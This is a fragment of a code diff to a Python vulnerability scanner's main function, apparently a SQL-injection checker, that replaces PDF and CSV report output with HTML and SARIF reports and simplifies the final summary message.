-                    'vulnerable': stats.vulnerable,
-                    'safe': stats.safe,
-                    'errors': stats.errors,
-                    'waf_detected': stats.waf_detected,
-                    'elapsed': int(stats.elapsed())
-                }
-                
-                reporter = PDFReporter(pdf_path)
-                reporter.generate(scan_stats, results)
-                console.print(f"[green]✓[/green] PDF report generated: {pdf_path}")
-                
-                if cloud_manager:
-                    cloud_manager.sync_results(pdf_path, scan_stats)
-            
-            # Determine overall status for filename
-            scan_verdict = "VULNERABLE" if stats.vulnerable > 0 else "SAFE"
-            vip_filename = f"{scan_verdict}_{sitename}_{timestamp}_vip.csv"
-            
-            export_csv(results, vip_filename)
-        except Exception as e:
-            console.print(f"[red]Error saving auto-report: {e}[/red]")
-        
+        report_gen.generate_html_report(args.html)
+    
+    if args.sarif:
+        report_gen.generate_sarif_report(args.sarif)
+    
+    # Summary
     console.print()
-    if stats.vulnerable > 0:
-        console.print(f"[bold red]⚠ Found {stats.vulnerable} potential SQLi vulnerabilities![/bold red]")
+    if statistics.vulnerable_urls > 0:
+        console.print(f"[bold red]⚠ Found {statistics.vulnerable_urls} vulnerable URLs![/bold red]")
     else:
-        console.print(f"[bold green]✓ No SQLi vulnerabilities detected[/bold green]")
-        
-    # Clean up state file on successful completion
-    if os.path.exists(STATE_FILE) and not args.resume:
-        try:
-            os.remove(STATE_FILE)
-        except:
-            pass
+        console.print(f"[bold green]✓ No vulnerabilities detected[/bold green]")
+    
+    console.print()
 
 if __name__ == "__main__":
     main()
